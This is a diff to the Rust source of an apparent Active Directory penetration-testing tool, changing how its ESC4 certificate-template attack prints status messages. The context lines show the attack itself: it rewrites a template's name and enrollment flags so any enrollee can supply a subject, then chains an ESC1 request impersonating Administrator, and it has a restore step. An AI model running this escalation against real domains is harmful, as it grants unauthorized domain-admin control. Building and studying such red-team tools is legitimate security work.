@@ -11,6 +11,7 @@
 //! Consent contract unchanged: preview by default, `--commit` to arm the write
 //! (F-C2b class). `--chain-esc1` implies `--commit`.
 
+use crate::ui;
 use anyhow::{bail, Result};
 use clap::Parser;
 
@@ -138,26 +139,26 @@ pub(crate) async fn esc4(mut a: Esc4Args) -> Result<()> {
         new_enroll.to_string().into_bytes(),
     )
     .await?;
-    println!(
-        "[+] {template_dn}: msPKI-Certificate-Name-Flag {name_flag}→{new_name} (SUPPLIES_SUBJECT), \
+    ui::ok(&format!(
+        "{template_dn}: msPKI-Certificate-Name-Flag {name_flag}→{new_name} (SUPPLIES_SUBJECT), \
          msPKI-Enrollment-Flag {enroll_flag}→{new_enroll} (cleared PEND_ALL_REQUESTS)"
-    );
+    ));
 
     if let Some(enrollee) = &a.enrollee {
-        eprintln!(
-            "[!] --enrollee {enrollee}: Enroll-ACE write on template DACL not implemented \
+        ui::warn(&format!(
+            "--enrollee {enrollee}: Enroll-ACE write on template DACL not implemented \
                    yet — flags alone often suffice if the template is already broadly enrollable."
-        );
+        ));
         let mut params = crate::gap_hint::HintParams::new();
         params.template = Some(a.template.clone());
         crate::gap_hint::hint_external(crate::gap_hint::Gap::TemplateAceEdit, &params);
     }
 
     if !a.chain_esc1 {
-        println!(
+        ui::note(&format!(
             "    → attack esc1 --template {} --alt-name Administrator",
             a.template
-        );
+        ));
         // Without --chain-esc1, we don't have an obvious moment to restore.
         // The operator drives the chain externally; restore is a follow-up call to their tooling.
         if a.restore {
@@ -198,10 +199,10 @@ pub(crate) async fn esc4(mut a: Esc4Args) -> Result<()> {
             )
         })?;
 
-    println!(
-        "[*] chaining esc1: template={} upn={alt_name} ca={ca} smb={smb_host} domain={smb_domain}",
+    ui::info(&format!(
+        "chaining esc1: template={} upn={alt_name} ca={ca} smb={smb_host} domain={smb_domain}",
         a.template
-    );
+    ));
 
     let chain_result = crate::attacks::esc1::esc1(crate::attacks::esc1::Esc1Args {
         auth: crate::shared_args::SmbAuth {
@@ -243,14 +244,14 @@ pub(crate) async fn esc4(mut a: Esc4Args) -> Result<()> {
             )
             .await;
         match (r1, r2) {
-            (Ok(_), Ok(_)) => println!(
-                "[+] restored {template_dn}: msPKI-Certificate-Name-Flag→{name_flag}, msPKI-Enrollment-Flag→{enroll_flag}"
-            ),
-            (r1, r2) => eprintln!(
-                "[!] restore FAILED — template MAY still be weaponized on the DC. \
+            (Ok(_), Ok(_)) => ui::ok(&format!(
+                "restored {template_dn}: msPKI-Certificate-Name-Flag→{name_flag}, msPKI-Enrollment-Flag→{enroll_flag}"
+            )),
+            (r1, r2) => ui::warn(&format!(
+                "restore FAILED — template MAY still be weaponized on the DC. \
                     Restore manually: name-flag→{name_flag}, enroll-flag→{enroll_flag}. \
                     errors: name={r1:?} enroll={r2:?}"
-            ),
+            )),
         }
     }
 
